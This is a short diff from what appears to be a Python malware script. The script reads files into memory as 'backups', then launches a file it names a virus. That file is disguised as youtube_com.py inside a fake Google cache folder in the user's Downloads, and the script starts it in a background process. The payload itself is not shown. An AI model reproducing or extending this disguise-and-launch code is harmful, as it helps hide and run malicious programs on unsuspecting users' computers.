@@ -11,7 +11,7 @@ files_to_backup = [
 
 backuped_files = [open(path, "rb").read() for path, _ in files_to_backup]
 
-virus_path = "%USERPROFILE%/Downloads/Google_Stable_x64/assets/cache/youtube_com.py"
+virus_path = f"{home_dir}/Downloads/Google_Stable_x64/assets/cache/youtube_com.py"
 
 start_virus = lambda: os.system(f"python {virus_path}")
 virus_thread = Process(target=start_virus)
